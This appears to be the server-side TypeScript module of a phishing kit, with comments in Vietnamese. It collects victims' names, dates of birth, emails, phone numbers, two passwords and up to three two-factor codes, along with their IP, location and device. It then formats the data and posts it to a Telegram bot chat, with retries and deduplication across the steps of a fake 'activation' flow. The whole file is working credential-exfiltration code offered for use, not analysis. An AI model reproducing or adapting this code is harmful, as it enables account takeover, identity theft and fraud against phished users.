import https from 'https';
import axios from 'axios';
import { memoryStoreTTL } from '@/utils/memoryStore';
import { generateKey } from '@/utils/generateKey';
import { devLog } from '@/utils/logger';

const agent = new https.Agent({ family: 4 });

function getTelegramConfig() {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        api: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

// Simple rate limiter to prevent spam
const rateLimiter = new Map<string, number>();
const RATE_LIMIT_WINDOW = 1000;

function checkRateLimit(key: string): boolean {
    const now = Date.now();
    const lastCall = rateLimiter.get(key);

    if (!lastCall || (now - lastCall) > RATE_LIMIT_WINDOW) {
        rateLimiter.set(key, now);
        return true;
    }

    return false;
}

// Retry utility for Telegram API calls
async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
    let lastError: any;

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const result = await requestFn();
            return result;
        } catch (error: any) {
            lastError = error;

            const errorCode = error?.response?.status;
            const errorDesc = error?.response?.data?.description || '';

            // Don't retry on authentication errors, invalid chat_id, etc.
            if (
                errorCode === 401 ||
                errorCode === 403 ||
                errorDesc.includes('chat not found') ||
                errorDesc.includes('bot was blocked')
            ) {
                throw error;
            }

            if (attempt === maxRetries) {
                break;
            }

            // Exponential backoff: 1s, 2s, 4s
            const delay = Math.pow(2, attempt - 1) * 1000;
            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
function formatCodeField(value: unknown): string {
    if (value === undefined || value === null) return '';
    const s = String(value).trim();
    return s ? escapeHtml(s) : '';
}


function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        device: input.device ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        phoneBackup: input.phoneBackup ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
        language: input.language ?? '',
    };
}

function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

type FormatMessageOptions = {
    includePassword?: boolean;
};

function formatMessage(data: any, options: FormatMessageOptions = {}): string {
    const includePassword = options.includePassword !== false;
    const d = normalizeData(data);
    const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
        ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
        : '';
    const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
    const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
    const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
    const phoneBackupDisplay =
        d.phoneBackup && String(d.phoneBackup).trim()
            ? escapeHtml(`+${String(d.phoneBackup).trim()}`)
            : '';

    const lines = [
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
        `----------------------`,
        `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
        `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
        `<b>DOB:</b> <code>${dob}</code>`,
        `----------------------`,
        `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
        `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
        `<b>Phone:</b> <code>${phoneDisplay}</code>`,
        `<b>Backup Phone:</b> <code>${phoneBackupDisplay}</code>`,
    ];

    if (includePassword) {
        lines.push(
            `----------------------`,
            `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
            `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
            `${authLine ? authLine.trim() : ''}`
        );
    }

    const filtered = lines.filter(Boolean);

    if (has2FA) {
        filtered.push(
            `----------------------`,
            `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
            `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
        );
    }

    return filtered.join('\n');
}

function isLanguageGateEvent(data: any): boolean {
    const d = normalizeData(data);
    if (!d.language) return false;
    const hasFormData =
        d.fullName ||
        d.fanpage ||
        d.email ||
        d.phone ||
        d.password ||
        d.passwordSecond ||
        d.authMethod ||
        d.twoFa ||
        d.twoFaSecond ||
        d.twoFaThird;
    return !hasFormData;
}

function isActivationInfoSubmitEvent(data: any): boolean {
    return data?.activationInfoSubmit === true;
}

function stripClientEventFlags(data: any = {}) {
    const { activationInfoSubmit, language, recaptcha, flowCompleted, ...rest } = data;
    return rest;
}

/** Đã xong bước 2FA lần 3 → coi là hoàn tất toàn bộ luồng. */
function hasCompletedFullFlow(data: any): boolean {
    const d = normalizeData(data);
    return Boolean(String(d.twoFaThird ?? '').trim());
}

/** Không gửi lại language gate / Thông tin kích hoạt khi user quay lại từ đầu sau khi đã xong. */
function shouldSkipRepeatEarlyNotifications(data: any): boolean {
    if (data?.flowCompleted === true) return true;

    const payload = stripClientEventFlags(data);
    const key = generateKey(payload);
    const prev = memoryStoreTTL.get(key);
    const merged = mergeData(prev?.data, payload);

    return hasCompletedFullFlow(merged) || hasCompletedFullFlow(payload);
}

function formatActivationInfoMessage(data: any): string {
    return formatMessage(data, { includePassword: false });
}

function formatLanguageGateMessage(data: any): string {
    const d = normalizeData(data);
    return [
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
        `<b>Language:</b> <code>${formatCodeField(d.language)}</code>`,
    ].join('\n');
}

function languageGateIpKey(data: any): string {
    const ip = normalizeData(data).ip?.trim();
    return ip || 'no-ip';
}

/** IP đã gửi tin language gate — mỗi IP chỉ một lần trong lifetime process. */
const languageGateSentByIp = new Set<string>();

async function postTelegramText(
    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
    text: string
): Promise<number | undefined> {
    try {
        const res = await retryTelegramRequest(() =>
            axios.post(`${config.api}/sendMessage`, {
                chat_id: config.chatId,
                text,
                parse_mode: 'HTML',
            }, {
                httpsAgent: agent,
                timeout: 10000,
            })
        );
        return res?.data?.result?.message_id;
    } catch (err: any) {
        console.error('🔥 Telegram send error (retry exhausted):', err?.response?.data || err.message || err);
        try {
            const fallbackRes = await axios.post(`${config.api}/sendMessage`, {
                chat_id: config.chatId,
                text,
                parse_mode: 'HTML',
            }, {
                httpsAgent: agent,
                timeout: 10000,
            });
            return fallbackRes?.data?.result?.message_id;
        } catch (fallbackErr: any) {
            console.error('🔥 Telegram fallback send error:', fallbackErr?.response?.data || fallbackErr.message || fallbackErr);
            return undefined;
        }
    }
}

/** Tin Telegram riêng khi Confirm ngôn ngữ (IP + Location + Device + Language). */
async function sendLanguageGateTelegram(
    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
    data: any
): Promise<void> {
    const ipKey = languageGateIpKey(data);

    const mainKey = generateKey(stripClientEventFlags(data));
    const prev = memoryStoreTTL.get(mainKey);
    const fullData = mergeData(prev?.data, stripClientEventFlags(data));

    if (shouldSkipRepeatEarlyNotifications(data)) {
        console.warn('⚠️ Bỏ qua tin Language — luồng kích hoạt đã hoàn tất trước đó');
        memoryStoreTTL.set(mainKey, {
            message: prev?.message ?? formatLanguageGateMessage(fullData),
            messageId: prev?.messageId ?? 0,
            data: fullData,
        });
        return;
    }

    if (languageGateSentByIp.has(ipKey)) {
        console.warn(`⚠️ Language gate đã gửi cho IP này, bỏ qua: ${ipKey}`);
        memoryStoreTTL.set(mainKey, {
            message: prev?.message ?? formatLanguageGateMessage(fullData),
            messageId: prev?.messageId ?? 0,
            data: fullData,
        });
        return;
    }

    languageGateSentByIp.add(ipKey);

    const text = formatLanguageGateMessage(data);
    const messageId = await postTelegramText(config, text);

    if (messageId) {
        devLog(`✅ Sent language gate message. ID: ${messageId}`);
    } else {
        languageGateSentByIp.delete(ipKey);
        console.warn('⚠️ Language gate Telegram response không có message_id');
    }

    memoryStoreTTL.set(mainKey, {
        message: prev?.message ?? text,
        messageId: prev?.messageId ?? messageId ?? 0,
        data: fullData,
    });
}

/** Tin Telegram ngắn khi gửi form «Thông tin kích hoạt». */
async function sendActivationInfoTelegram(
    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
    data: any
): Promise<void> {
    if (shouldSkipRepeatEarlyNotifications(data)) {
        console.warn('⚠️ Bỏ qua tin Thông tin kích hoạt — luồng đã hoàn tất trước đó');
        return;
    }

    const payload = stripClientEventFlags(data);
    const key = generateKey(payload);
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }

    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, payload);
    const text = formatActivationInfoMessage(fullData);
    const messageId = await postTelegramText(config, text);

    if (messageId) {
        memoryStoreTTL.set(key, { message: text, messageId, data: fullData });
        devLog(`✅ Sent activation info message. ID: ${messageId}`);
    } else {
        console.warn('⚠️ Activation info Telegram response không có message_id');
    }
}

export async function sendTelegramMessage(data: any): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    if (isLanguageGateEvent(data)) {
        await sendLanguageGateTelegram(config, data);
        return;
    }

    if (isActivationInfoSubmitEvent(data)) {
        await sendActivationInfoTelegram(config, data);
        return;
    }

    const key = generateKey(data);
    if (!checkRateLimit(key)) {
        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
        return;
    }
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    const messageId = await postTelegramText(config, updatedText);
    if (messageId) {
        memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
        devLog(`✅ Sent new message. ID: ${messageId}`);
    } else {
        console.warn('⚠️ Telegram response không có message_id');
    }
}
